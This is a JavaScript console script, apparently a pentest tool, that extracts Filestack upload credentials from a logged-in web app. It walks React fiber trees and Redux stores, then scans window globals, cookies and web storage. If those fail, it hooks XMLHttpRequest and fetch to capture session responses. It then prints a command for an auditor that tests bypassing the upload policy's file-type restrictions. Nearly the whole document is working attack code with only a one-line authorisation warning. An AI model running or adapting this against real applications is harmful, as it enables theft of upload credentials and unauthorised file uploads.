/**
 * filestack_grabber.js
 * ─────────────────────
 * Console snippet — extracts Filestack credentials from any web app
 * and prints the ready-to-run Python audit command.
 */
(function(){
  'use strict';

  // ── ANSI-style console styling ─────────────────────────────────────────────
  const S = {
    box:    'background:#1a1a2e;color:#e0e0e0;font-family:monospace;font-size:13px;padding:4px 8px;border-left:4px solid #4fc3f7',
    head:   'background:#0d0d1a;color:#4fc3f7;font-size:15px;font-weight:bold;font-family:monospace;padding:6px 12px;border-left:4px solid #4fc3f7',
    warn:   'background:#2a1a00;color:#ffcc02;font-size:13px;font-family:monospace;padding:4px 8px;border-left:4px solid #ffcc02',
    ok:     'background:#001a0d;color:#69f0ae;font-size:13px;font-family:monospace;padding:4px 8px;border-left:4px solid #69f0ae',
    fail:   'background:#1a0000;color:#ff5252;font-size:13px;font-family:monospace;padding:4px 8px;border-left:4px solid #ff5252',
    cmd:    'background:#0a0a0a;color:#69f0ae;font-size:13px;font-family:monospace;padding:6px 12px;border:1px solid #333',
    muted:  'color:#888;font-size:12px;font-family:monospace;padding:2px 8px',
    step:   'background:#111;color:#90caf9;font-size:13px;font-family:monospace;padding:4px 8px;border-left:4px solid #1565c0',
  };

  function L(style, msg){ console.log('%c' + msg, style); }

  // ── ┌─────────────────────────────────────────────────────────────────────┐
  // ── │  PRE-RUN INSTRUCTIONS                                               │
  // ── └─────────────────────────────────────────────────────────────────────┘
  console.group('%c FILESTACK CREDENTIAL GRABBER ', S.head);

  L(S.box,  '');
  L(S.box,  '  READ BEFORE RUNNING                                              ');
  L(S.box,  '  ─────────────────────────────────────────────────────────────   ');
  L(S.box,  '  This script attempts to extract Filestack API credentials        ');
  L(S.box,  '  from the current page\'s memory, cookies, and storage.           ');
  L(S.box,  '  It then prints a ready-to-run Python command for the policy      ');
  L(S.box,  '  auditor (filestack_policy_auditor.py).                           ');
  L(S.box,  '');

  L(S.warn, '');
  L(S.warn, '  ⚠  REQUIREMENTS — check all before continuing:                  ');
  L(S.warn, '');
  L(S.step, '  [1]  You are on a page that uses Filestack for file uploads.');
  L(S.step, '       Look for: upload buttons, drag-and-drop zones, image pickers.');
  L(S.step, '');
  L(S.step, '  [2]  You are LOGGED IN to the application with an account');
  L(S.step, '       that has file upload access (instructor / editor / admin).');
  L(S.step, '       Filestack credentials are only issued to authenticated users.');
  L(S.step, '');
  L(S.step, '  [3]  Navigate to the page that CONTAINS the upload widget,');
  L(S.step, '       not just the homepage. Examples:');
  L(S.step, '       • Question / post creation page');
  L(S.step, '       • Profile / avatar upload page');
  L(S.step, '       • Content editor with image insert');
  L(S.step, '');
  L(S.step, '  [4]  If Method 1-5 all fail, the script installs a network hook.');
  L(S.step, '       In that case: click any upload button ONCE after the script');
  L(S.step, '       runs. The credentials will appear when the app calls its');
  L(S.step, '       /filestack/session (or equivalent) API endpoint.');
  L(S.step, '');
  L(S.warn, '  ⚠  USE ON AUTHORISED TARGETS ONLY — pentest scope applies.      ');
  L(S.warn, '');

  L(S.box,  '  WHAT HAPPENS NEXT:                                              ');
  L(S.box,  '  ─────────────────────────────────────────────────────────────   ');
  L(S.box,  '  • If credentials are found, a Python command is printed below.   ');
  L(S.box,  '  • Copy that command and run it in your terminal.                 ');
  L(S.box,  '  • The auditor will analyse the policy and optionally test        ');
  L(S.box,  '    direct file uploads to confirm the bypass.                     ');
  L(S.box,  '');

  L(S.muted, '  Press any key or wait — extraction starts automatically...');
  L(S.box,  '');

  console.groupEnd();
  console.log('');

  // ── Helpers ────────────────────────────────────────────────────────────────
  function log(msg)  { console.log('%c[FS-GRAB] ' + msg, S.muted); }
  function ok(msg)   { console.log('%c[✓] ' + msg, S.ok); }
  function warn(msg) { console.log('%c[!] ' + msg, S.warn); }
  function fail(msg) { console.log('%c[✗] ' + msg, S.fail); }

  function parseB64Policy(b64){
    try {
      const pad = (4 - b64.length % 4) % 4;
      return JSON.parse(atob((b64 + '='.repeat(pad)).replace(/-/g,'+').replace(/_/g,'/')));
    } catch(e){ return null; }
  }

  function parseSuffix(suffix){
    if(!suffix || suffix.length < 10) return null;
    const params = {};
    suffix.split('&').forEach(p => {
      const [k,...v] = p.split('=');
      params[k] = v.join('=');
    });
    return (params.key && params.policy && params.signature) ? params : null;
  }

  function presentResult(source, key, policy_b64, signature){
    const policy = parseB64Policy(policy_b64);

    console.log('');
    console.group('%c CREDENTIALS FOUND ', S.ok);
    ok('Source     : ' + source);
    L(S.muted, '  API Key   : ' + key + '  (public identifier — not a secret by itself)');
    L(S.muted, '  Signature : ' + signature.substring(0,24) + '...');

    if(policy){
      L(S.muted, '  Policy    : ' + JSON.stringify(policy));
      const aft = policy.allowed_file_types;
      if(!aft || aft.length === 0){
        L(S.fail,  '  [✗] allowed_file_types ABSENT — policy likely VULNERABLE to bypass');
      } else {
        L(S.ok,    '  [✓] allowed_file_types: ' + JSON.stringify(aft));
      }
      if(policy.expiry){
        const exp = new Date(policy.expiry * 1000);
        const expired = Date.now() > policy.expiry * 1000;
        L(expired ? S.fail : S.ok,
          '  [' + (expired?'✗':'✓') + '] Expiry: ' + exp.toUTCString() +
          (expired ? '  ← EXPIRED (get a fresh session)' : ''));
      }
    }

    console.groupEnd();

    const suffix = 'key=' + key + '&policy=' + policy_b64 + '&signature=' + signature;
    window._fsCredentials = { key, policy_b64, signature, policy, suffix };

    console.log('');
    console.group('%c  COPY AND RUN THIS COMMAND IN YOUR TERMINAL  ', 'background:#0d2b0d;color:#69f0ae;font-size:14px;font-weight:bold;font-family:monospace;padding:8px 16px;border:2px solid #69f0ae');
    console.log('%c python filestack_policy_auditor.py --suffix "' + suffix + '"', S.cmd);
    console.groupEnd();

    L(S.muted, '');
    L(S.muted, '  Credentials also stored in window._fsCredentials for programmatic access.');
    L(S.muted, '  Run: copy(window._fsCredentials.suffix)  to copy just the suffix string.');
    console.log('');

    return true;
  }

  // ── Method 1 & 2: React fiber → Redux store ────────────────────────────────
  function tryReactFiber(){
    const rootIds = ['react-root','root','app','__next','__nuxt','application'];
    let rootEl = null;
    for(const id of rootIds){
      const el = document.getElementById(id);
      if(el){ rootEl = el; break; }
    }
    if(!rootEl){
      const all = document.querySelectorAll('div,section,main,body');
      for(const el of Array.from(all).slice(0,30)){
        if(Object.keys(el).some(k=>
          k.startsWith('__reactContainer')||
          k.startsWith('__reactFiber')||
          k.startsWith('__reactInternalInstance'))){
          rootEl = el; break;
        }
      }
    }
    if(!rootEl) return false;

    const fk = Object.keys(rootEl).find(k =>
      k.startsWith('__reactContainer') ||
      k.startsWith('__reactFiber') ||
      k.startsWith('__reactInternalInstance')
    );
    if(!fk) return false;

    let store = null;
    const seen = new WeakSet();

    function walkFiber(fiber, depth){
      if(!fiber || depth > 100 || seen.has(fiber)) return;
      try{ seen.add(fiber); }catch(e){ return; }
      try{
        const p = fiber.memoizedProps;
        if(p){
          if(p.store && typeof p.store.getState==='function'){ store=p.store; return; }
          if(p.value && p.value.store && typeof p.value.store.getState==='function'){
            store=p.value.store; return;
          }
        }
        let s=fiber.memoizedState, si=0;
        while(s && si++<20){
          if(s.memoizedState && typeof s.memoizedState==='object'){
            const mm=s.memoizedState;
            if(mm.getState && typeof mm.getState==='function'){ store=mm; return; }
            if(mm.store && typeof mm.store.getState==='function'){ store=mm.store; return; }
          }
          s=s.next;
        }
      }catch(e){}
      walkFiber(fiber.child, depth+1);
      if(!store) walkFiber(fiber.sibling, depth+1);
    }

    walkFiber(rootEl[fk], 0);
    if(!store) return false;

    let state;
    try{ state=store.getState(); }catch(e){ return false; }

    function deepSearch(obj, depth){
      if(!obj || typeof obj!=='object' || depth>8) return null;
      if(obj.suffix && typeof obj.suffix==='string' && obj.suffix.includes('policy=')){
        return parseSuffix(obj.suffix);
      }
      if(obj.filestack && obj.filestack.suffix) return parseSuffix(obj.filestack.suffix);
      for(const k of Object.keys(obj)){
        const r = deepSearch(obj[k], depth+1);
        if(r) return r;
      }
      return null;
    }

    const creds = deepSearch(state, 0);
    if(creds) return presentResult('React Redux store (fiber)', creds.key, creds.policy, creds.signature);
    return false;
  }

  // ── Method 3: window globals ───────────────────────────────────────────────
  function tryWindowGlobals(){
    const candidates = [
      window.__REDUX_STORE__, window.store, window.reduxStore,
      window.__store__, window.app && window.app.store,
    ].filter(Boolean);
    for(const s of candidates){
      try{
        const state = s.getState ? s.getState() : s;
        const fs = state.session?.filestack || state.filestack || state.auth?.filestack;
        if(fs && fs.suffix){
          const c = parseSuffix(fs.suffix);
          if(c) return presentResult('window global store', c.key, c.policy, c.signature);
        }
      }catch(e){}
    }
    return false;
  }

  // ── Method 4: Cookies ─────────────────────────────────────────────────────
  function tryCookies(){
    for(const cookie of document.cookie.split(';')){
      const eqIdx = cookie.indexOf('=');
      if(eqIdx<0) continue;
      const name = cookie.substring(0,eqIdx).trim();
      let val = cookie.substring(eqIdx+1).trim();
      try{ val = decodeURIComponent(val); }catch(e){}
      try{
        const parsed = JSON.parse(val);
        const fs = parsed?.session?.filestack || parsed?.filestack;
        if(fs && fs.suffix){
          const c = parseSuffix(fs.suffix);
          if(c) return presentResult('cookie: '+name, c.key, c.policy, c.signature);
        }
      }catch(e){}
      if(val.includes('policy=') && val.includes('signature=')){
        const c = parseSuffix(val);
        if(c) return presentResult('cookie: '+name, c.key, c.policy, c.signature);
      }
    }
    return false;
  }

  // ── Method 5: Web Storage ─────────────────────────────────────────────────
  function tryStorage(){
    for(const storage of [localStorage, sessionStorage]){
      try{
        for(let i=0;i<storage.length;i++){
          const key = storage.key(i);
          let val = storage.getItem(key);
          try{ val=JSON.parse(val); }catch(e){}
          if(typeof val==='object' && val){
            const fs = val?.session?.filestack || val?.filestack || val?.auth?.filestack;
            if(fs && fs.suffix){
              const c=parseSuffix(fs.suffix);
              if(c) return presentResult('storage['+key+']', c.key, c.policy, c.signature);
            }
          }
          if(typeof val==='string' && val.includes('policy=') && val.includes('signature=')){
            const c=parseSuffix(val);
            if(c) return presentResult('storage['+key+']', c.key, c.policy, c.signature);
          }
        }
      }catch(e){}
    }
    return false;
  }

  // ── Method 6: Network hook ────────────────────────────────────────────────
  function installNetworkHook(){
    console.log('');
    console.group('%c NETWORK HOOK INSTALLED ', S.warn);
    L(S.warn,  '');
    L(S.warn,  '  Static extraction found no Filestack credentials.             ');
    L(S.warn,  '  A network hook is now active.                                 ');
    L(S.warn,  '');
    L(S.step,  '  NEXT STEP — do ONE of the following to trigger the session:   ');
    L(S.step,  '  • Click any file upload button / attachment icon on this page ');
    L(S.step,  '  • Navigate to a page that has an upload feature               ');
    L(S.step,  '  • Refresh the page if it auto-fetches the Filestack session   ');
    L(S.step,  '');
    L(S.step,  '  The credentials and Python command will appear here            ');
    L(S.step,  '  automatically as soon as the app calls its session endpoint.  ');
    L(S.warn,  '');
    L(S.muted, '  Hook covers: XHR, fetch — watching for filestack / session URLs');
    L(S.warn,  '');
    console.groupEnd();

    function handleData(data, url){
      const fs = data?.data?.filestack || data?.filestack || data;
      if(fs && fs.suffix){
        const c=parseSuffix(fs.suffix);
        if(c){ presentResult('network hook: '+url, c.key, c.policy, c.signature); return; }
      }
      if(data?.suffix){
        const c=parseSuffix(data.suffix);
        if(c) presentResult('network hook: '+url, c.key, c.policy, c.signature);
      }
    }

    const _xOpen=XMLHttpRequest.prototype.open;
    const _xSend=XMLHttpRequest.prototype.send;
    XMLHttpRequest.prototype.open=function(...a){
      this._grabUrl=a[1]||''; return _xOpen.apply(this,a);
    };
    XMLHttpRequest.prototype.send=function(...a){
      this.addEventListener('load',function(){
        if(!(this._grabUrl||'').match(/filestack|session/i)) return;
        try{ handleData(JSON.parse(this.responseText), this._grabUrl); }catch(e){}
      });
      return _xSend.apply(this,a);
    };

    const _fetch=window.fetch;
    window.fetch=function(...a){
      const url=(typeof a[0]==='string'?a[0]:a[0]?.url)||'';
      const p=_fetch.apply(this,a);
      if(/filestack|session/i.test(url)){
        p.then(r=>r.clone().json().then(d=>handleData(d,url)).catch(()=>{})).catch(()=>{});
      }
      return p;
    };
  }

  // ── Run extraction pipeline ────────────────────────────────────────────────
  console.log('%c Starting extraction... ', S.muted);
  console.log('');

  const methods = [
    ['React Redux fiber',  tryReactFiber],
    ['Window globals',     tryWindowGlobals],
    ['Cookies',            tryCookies],
    ['Web storage',        tryStorage],
  ];

  let found = false;
  for(const [name, fn] of methods){
    log('Trying: ' + name + '...');
    try{ if(fn()){ found=true; break; } }
    catch(e){ fail('Error in '+name+': '+e.message); }
  }

  if(!found) installNetworkHook();

})();
